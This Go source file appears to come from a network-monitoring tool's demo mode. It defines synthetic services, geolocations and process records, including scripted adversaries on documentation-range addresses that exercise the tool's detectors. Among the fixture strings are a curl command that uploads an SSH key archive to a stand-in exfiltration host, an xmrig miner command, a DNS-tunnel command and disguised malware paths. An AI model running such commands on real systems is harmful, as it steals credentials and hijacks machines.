// Package synth generates a living, breathing network for --demo: real
// packets (TCP handshakes, post-quantum ClientHellos, encrypted QUIC
// Initials, DNS with CNAME chains, video bursts, downloads, voice calls)
// that flow through the very same decoders and engine as live traffic,
// plus a cycle of scripted incidents that trip every detector.
//
// Everything that plays a villain lives in IETF documentation address
// space (RFC 5737 TEST-NETs) at clearly fictional "(demo)" organizations,
// so the public demo never accuses a real host of anything.
package synth

import (
	"net/netip"

	"github.com/SharvikS/telluric/internal/geo"
	"github.com/SharvikS/telluric/internal/procmap"
)

// The demo machine: an RFC 1918 LAN address and the IPv6 documentation
// prefix, so nothing about the viewer's real network appears.
var (
	me4     = netip.MustParseAddr("192.168.1.42")
	me6     = netip.MustParseAddr("2001:db8:42::1337")
	router  = netip.MustParseAddr("192.168.1.1")
	scanner = netip.MustParseAddr("192.168.1.66")

	myMAC       = [6]byte{0x3c, 0x05, 0xc8, 0x42, 0x13, 0x37}
	routerMAC   = [6]byte{0x8c, 0xa3, 0x99, 0x01, 0x02, 0x03}
	attackerMAC = [6]byte{0xde, 0xad, 0xbe, 0xef, 0x00, 0x66}
)

// Home is where the demo machine lives: Frankfurt, home of DE-CIX, the
// world's busiest internet exchange.
var Home = geo.Home{Lat: 50.1109, Lon: 8.6821, Known: true, City: "Frankfurt", CC: "DE", Src: "flag"}

type place struct {
	city, region, cc, country string
	lat, lon                  float64
}

var (
	frankfurt    = place{"Frankfurt am Main", "Hesse", "DE", "Germany", 50.1109, 8.6821}
	amsterdam    = place{"Amsterdam", "North Holland", "NL", "Netherlands", 52.3676, 4.9041}
	london       = place{"London", "England", "GB", "United Kingdom", 51.5074, -0.1278}
	paris        = place{"Paris", "Île-de-France", "FR", "France", 48.8566, 2.3522}
	stockholm    = place{"Stockholm", "Stockholm", "SE", "Sweden", 59.3293, 18.0686}
	dublin       = place{"Dublin", "Leinster", "IE", "Ireland", 53.3498, -6.2603}
	ashburn      = place{"Ashburn", "Virginia", "US", "United States", 39.0438, -77.4874}
	kansasCity   = place{"Kansas City", "Missouri", "US", "United States", 39.0997, -94.5786}
	sanFrancisco = place{"San Francisco", "California", "US", "United States", 37.7749, -122.4194}
	sanDiego     = place{"San Diego", "California", "US", "United States", 32.7157, -117.1611}
	seattle      = place{"Seattle", "Washington", "US", "United States", 47.6062, -122.3321}
	toronto      = place{"Toronto", "Ontario", "CA", "Canada", 43.6532, -79.3832}
	saoPaulo     = place{"São Paulo", "São Paulo", "BR", "Brazil", -23.5505, -46.6333}
	tokyo        = place{"Tokyo", "Tokyo", "JP", "Japan", 35.6762, 139.6503}
	singapore    = place{"Singapore", "", "SG", "Singapore", 1.3521, 103.8198}
	sydney       = place{"Sydney", "New South Wales", "AU", "Australia", -33.8688, 151.2093}
	mumbai       = place{"Mumbai", "Maharashtra", "IN", "India", 19.0760, 72.8777}
	johannesburg = place{"Johannesburg", "Gauteng", "ZA", "South Africa", -26.2041, 28.0473}
	seoul        = place{"Seoul", "Seoul", "KR", "South Korea", 37.5665, 126.9780}

	// Fictional placements for the demo's adversaries.
	reykjavik = place{"Reykjavík", "Capital Region", "IS", "Iceland", 64.1466, -21.9426}
	zurich    = place{"Zürich", "Zurich", "CH", "Switzerland", 47.3769, 8.5417}
	montreal  = place{"Montréal", "Quebec", "CA", "Canada", 45.5017, -73.5673}
	auckland  = place{"Auckland", "Auckland", "NZ", "New Zealand", -36.8485, 174.7633}
	berlin    = place{"Berlin", "Berlin", "DE", "Germany", 52.5200, 13.4050}
)

type service struct {
	name   string
	cnames []string
	ip     netip.Addr
	port   uint16
	quic   bool
	alpn   []string
	at     place
	asn    uint32
	org    string
}

func svc(name, ip string, port uint16, quic bool, at place, asn uint32, org string, cnames ...string) *service {
	alpn := []string{"h2", "http/1.1"}
	if quic {
		alpn = []string{"h3"}
	}
	return &service{name: name, cnames: cnames, ip: netip.MustParseAddr(ip), port: port, quic: quic, alpn: alpn, at: at, asn: asn, org: org}
}

var (
	ytWeb     = svc("www.youtube.com", "142.250.185.78", 443, true, frankfurt, 15169, "Google LLC", "youtube-ui.l.google.com")
	ytVideo   = svc("rr4---sn-4g5e6nzz.googlevideo.com", "2a00:1450:4001:82f::e", 443, true, frankfurt, 15169, "Google LLC")
	google    = svc("www.google.com", "142.250.186.36", 443, true, frankfurt, 15169, "Google LLC")
	gmail     = svc("mail.google.com", "142.250.74.197", 443, true, mountainView(), 15169, "Google LLC")
	github    = svc("github.com", "140.82.121.4", 443, false, frankfurt, 36459, "GitHub, Inc.")
	githubSSH = svc("github.com", "140.82.121.3", 22, false, frankfurt, 36459, "GitHub, Inc.")
	ghRaw     = svc("raw.githubusercontent.com", "185.199.108.133", 443, false, amsterdam, 54113, "Fastly, Inc.")
	anthropic = svc("api.anthropic.com", "160.79.104.10", 443, false, sanFrancisco, 399358, "Anthropic, PBC")
	claudeAI  = svc("claude.ai", "160.79.104.12", 443, false, sanFrancisco, 399358, "Anthropic, PBC")
	discordGW = svc("gateway.discord.gg", "162.159.135.234", 443, false, sanFrancisco, 13335, "Cloudflare, Inc.")
	discordVC = svc("rotterdam4472.discord.media", "66.22.231.145", 50003, false, amsterdam, 49544, "Discord, Inc.")
	spotifyAP = svc("spclient.wg.spotify.com", "35.186.224.24", 443, false, kansasCity, 396982, "Google LLC")
	spotifyAU = svc("audio-ak.spotifycdn.com", "2.21.20.137", 443, false, frankfurt, 20940, "Akamai International B.V.", "audio-ak.spotifycdn.com.edgesuite.net")
	steamCDN  = svc("cache5-fra1.steamcontent.com", "155.133.248.39", 80, false, frankfurt, 32590, "Valve Corporation")
	steamAPI  = svc("api.steampowered.com", "23.53.38.22", 443, false, amsterdam, 20940, "Akamai International B.V.")
	telemetry = svc("incoming.telemetry.mozilla.org", "34.120.208.123", 443, false, kansasCity, 396982, "Google LLC")
	reddit    = svc("www.reddit.com", "151.101.65.140", 443, true, sanFrancisco, 54113, "Fastly, Inc.", "reddit.map.fastly.net")
	wikipedia = svc("en.wikipedia.org", "185.15.59.224", 443, false, amsterdam, 14907, "Wikimedia Foundation Inc.", "dyna.wikimedia.org")
	hn        = svc("news.ycombinator.com", "209.216.230.207", 443, false, sanDiego, 21581, "M5 Computer Security")
	stackOver = svc("stackoverflow.com", "104.18.32.7", 443, true, sanFrancisco, 13335, "Cloudflare, Inc.")
	npm       = svc("registry.npmjs.org", "104.16.27.34", 443, false, sanFrancisco, 13335, "Cloudflare, Inc.")
	pypi      = svc("files.pythonhosted.org", "151.101.0.223", 443, false, sanFrancisco, 54113, "Fastly, Inc.", "dualstack.python.map.fastly.net")
	docker    = svc("registry-1.docker.io", "54.236.113.205", 443, false, ashburn, 14618, "Amazon.com, Inc.")
	dockerCDN = svc("production.cloudflare.docker.com", "104.16.98.215", 443, false, sanFrancisco, 13335, "Cloudflare, Inc.")
	telegram  = svc("venus.web.telegram.org", "149.154.167.99", 443, false, amsterdam, 62041, "Telegram Messenger Inc")
	whatsapp  = svc("web.whatsapp.com", "157.240.0.53", 443, false, frankfurt, 32934, "Facebook, Inc.")
	twitch    = svc("video-edge-c2a8c4.fra05.abs.hls.ttvnw.net", "52.223.200.110", 443, false, frankfurt, 46489, "Twitch Interactive Inc.")
	netflix   = svc("ipv4-c001-fra001-ix.1.oca.nflxvideo.net", "45.57.90.1", 443, false, frankfurt, 2906, "Netflix Streaming Services Inc.")
	ntp       = svc("time.cloudflare.com", "162.159.200.123", 123, false, sanFrancisco, 13335, "Cloudflare, Inc.")
	doh       = svc("mozilla.cloudflare-dns.com", "1.1.1.1", 443, false, sanFrancisco, 13335, "Cloudflare, Inc.")
	openai    = svc("api.openai.com", "104.18.6.192", 443, false, sanFrancisco, 13335, "Cloudflare, Inc.")
	bbc       = svc("www.bbc.co.uk", "151.101.0.81", 443, false, london, 54113, "Fastly, Inc.")
	lemonde   = svc("www.lemonde.fr", "151.101.122.217", 443, false, paris, 54113, "Fastly, Inc.")
	spotify2  = svc("guc3-dealer.spotify.com", "35.186.224.47", 443, false, stockholm, 396982, "Google LLC")
	msUpdate  = svc("mirror.leaseweb.net", "5.79.108.33", 443, false, amsterdam, 60781, "LeaseWeb Netherlands B.V.")
	crates    = svc("static.crates.io", "18.66.97.21", 443, false, dublin, 16509, "Amazon.com, Inc.")
	gameTokyo = svc("ap-northeast.game.example", "198.18.7.42", 27015, false, tokyo, 64512, "Example Game Hosting (demo)")
	vpsSG     = svc("sg-01.vps.example", "198.18.9.10", 22, false, singapore, 64513, "Example Cloud (demo)")

	// rclone backup destinations across the planet.
	s3 = []*service{
		svc("s3.ap-south-1.amazonaws.com", "52.219.64.31", 443, false, mumbai, 16509, "Amazon.com, Inc."),
		svc("s3.ap-southeast-2.amazonaws.com", "52.95.128.17", 443, false, sydney, 16509, "Amazon.com, Inc."),
		svc("s3.sa-east-1.amazonaws.com", "52.95.163.40", 443, false, saoPaulo, 16509, "Amazon.com, Inc."),
		svc("s3.af-south-1.amazonaws.com", "52.95.75.12", 443, false, johannesburg, 16509, "Amazon.com, Inc."),
		svc("s3.ap-northeast-1.amazonaws.com", "52.219.0.8", 443, false, tokyo, 16509, "Amazon.com, Inc."),
		svc("s3.ap-northeast-2.amazonaws.com", "52.219.56.4", 443, false, seoul, 16509, "Amazon.com, Inc."),
		svc("s3.ca-central-1.amazonaws.com", "52.95.145.6", 443, false, toronto, 16509, "Amazon.com, Inc."),
		svc("s3.us-west-2.amazonaws.com", "52.218.128.9", 443, false, seattle, 16509, "Amazon.com, Inc."),
	}

	// Adversaries: documentation address space, fictional organizations.
	c2       = svc("", "203.0.113.66", 8443, false, reykjavik, 64496, "Northwind Bulletproof Hosting (demo)")
	exfilDst = svc("", "198.51.100.23", 443, false, zurich, 64497, "Contoso Anonymous Storage (demo)")
	pool     = svc("pool.minexmr.example", "198.51.100.77", 3333, false, montreal, 64498, "Fabrikam Mining Pool (demo)")
	torRelay = svc("", "192.0.2.101", 9001, false, berlin, 64499, "Tor relay (demo)")
	badIntel = svc("cdn-update.example", "192.0.2.13", 443, false, auckland, 64500, "Feodo-listed botnet C2 (demo)")
)

func mountainView() place {
	return place{"Mountain View", "California", "US", "United States", 37.3861, -122.0839}
}

// browsing is the weighted pool firefox picks from.
var browsing = []struct {
	s *service
	w int
}{
	{google, 10}, {ytWeb, 8}, {github, 8}, {reddit, 6}, {wikipedia, 5}, {hn, 5}, {stackOver, 6},
	{gmail, 4}, {claudeAI, 5}, {bbc, 3}, {lemonde, 2}, {whatsapp, 3}, {telegram, 2}, {ghRaw, 3}, {openai, 2},
}

// services returns every service, for the locator.
func allServices() []*service {
	all := []*service{ytWeb, ytVideo, google, gmail, github, githubSSH, ghRaw, anthropic, claudeAI, discordGW, discordVC,
		spotifyAP, spotifyAU, steamCDN, steamAPI, telemetry, reddit, wikipedia, hn, stackOver, npm, pypi, docker, dockerCDN,
		telegram, whatsapp, twitch, netflix, ntp, doh, openai, bbc, lemonde, spotify2, msUpdate, crates, gameTokyo, vpsSG,
		c2, exfilDst, pool, torRelay, badIntel}
	return append(all, s3...)
}

// Locator answers geolocation for the demo world, offline.
type Locator struct {
	by map[netip.Addr]geo.Location
}

// NewLocator returns the demo world's locator.
func NewLocator() *Locator {
	l := &Locator{by: map[netip.Addr]geo.Location{}}
	for _, s := range allServices() {
		l.by[s.ip] = geo.Location{
			HasCoord: true, Lat: s.at.lat, Lon: s.at.lon, City: s.at.city, Region: s.at.region,
			CC: s.at.cc, Country: s.at.country, ASN: s.asn, Org: s.org,
		}
	}
	return l
}

// Locate implements engine.Locator.
func (l *Locator) Locate(ip netip.Addr) (geo.Location, bool) {
	loc, ok := l.by[ip]
	return loc, ok
}

// IntelIPs lists the demo world's threat-feed entries.
func IntelIPs() map[netip.Addr]string {
	return map[netip.Addr]string{badIntel.ip: "Feodo Tracker (demo): Emotet C2"}
}

func proc(pid int, name, exe, cmd, user, unit string) *procmap.Process {
	return &procmap.Process{Key: procmap.Key{PID: pid, Start: uint64(pid) * 977}, PID: pid, Name: name, Exe: exe, Cmd: cmd, UID: 1000, User: user, Unit: unit}
}

var (
	pFirefox  = proc(4242, "firefox", "/usr/lib/firefox/firefox", "/usr/lib/firefox/firefox", "demo", "app-hyprland-firefox-4242.scope")
	pDiscord  = proc(5150, "Discord", "/opt/discord/Discord", "/opt/discord/Discord --enable-features=UseOzonePlatform", "demo", "app-hyprland-discord-5150.scope")
	pSpotify  = proc(6060, "spotify", "/opt/spotify/spotify", "/opt/spotify/spotify", "demo", "app-hyprland-spotify-6060.scope")
	pSteam    = proc(7070, "steam", "/home/demo/.local/share/Steam/ubuntu12_32/steam", "steam -silent", "demo", "app-hyprland-steam-7070.scope")
	pClaude   = proc(8080, "claude", "/home/demo/.local/bin/claude", "claude", "demo", "kitty-8001-0.scope")
	pSSH      = proc(9090, "ssh", "/usr/bin/ssh", "ssh git@github.com git-receive-pack 'SharvikS/telluric.git'", "demo", "kitty-8001-0.scope")
	pSSHvps   = proc(9091, "ssh", "/usr/bin/ssh", "ssh demo@sg-01.vps.example", "demo", "kitty-8002-0.scope")
	pResolved = proc(512, "systemd-resolved", "/usr/lib/systemd/systemd-resolved", "/usr/lib/systemd/systemd-resolved", "systemd-resolve", "systemd-resolved.service")
	pTimesync = proc(513, "systemd-timesyncd", "/usr/lib/systemd/systemd-timesyncd", "/usr/lib/systemd/systemd-timesyncd", "systemd-timesync", "systemd-timesyncd.service")
	pDocker   = proc(1024, "dockerd", "/usr/bin/dockerd", "/usr/bin/dockerd -H fd://", "root", "docker.service")
	pRclone   = proc(2048, "rclone", "/usr/bin/rclone", "rclone sync /home/demo/photos s3:backups", "demo", "rclone-backup.service")
	pTelegram = proc(3030, "telegram-desktop", "/usr/bin/telegram-desktop", "telegram-desktop", "demo", "app-hyprland-telegram-3030.scope")
	pNode     = proc(3131, "node", "/usr/bin/node", "node /usr/bin/npm install", "demo", "kitty-8003-0.scope")
	pPip      = proc(3232, "python3", "/usr/bin/python3", "python3 -m pip install torch", "demo", "kitty-8003-0.scope")
	pCargo    = proc(3333, "cargo", "/home/demo/.cargo/bin/cargo", "cargo build --release", "demo", "kitty-8003-0.scope")
	pGame     = proc(3434, "game.x86_64", "/home/demo/Games/Nebula/game.x86_64", "./game.x86_64", "demo", "app-hyprland-steam-7070.scope")

	// The villains.
	pBeacon = proc(31337, "python3", "/usr/bin/python3", "python3 /tmp/.cache/.update.py --quiet", "demo", "")
	pMalw   = proc(6666, "kworkerd", "/dev/shm/.x/kworkerd", "[kworkerd]", "demo", "")
	pMiner  = proc(7777, "xmrig", "/tmp/.xm/xmrig", "/tmp/.xm/xmrig -o pool.minexmr.example:3333 --background", "demo", "")
	pCurl   = proc(9999, "curl", "/usr/bin/curl", "curl -sk -T /home/demo/.ssh.tar.gz https://198.51.100.23/u", "demo", "")
	pTor    = proc(9050, "tor", "/usr/bin/tor", "/usr/bin/tor -f /etc/tor/torrc", "tor", "tor.service")
	pDNSTun = proc(4444, "iodine", "/usr/bin/iodine", "iodine -f t.example.com", "demo", "")
)
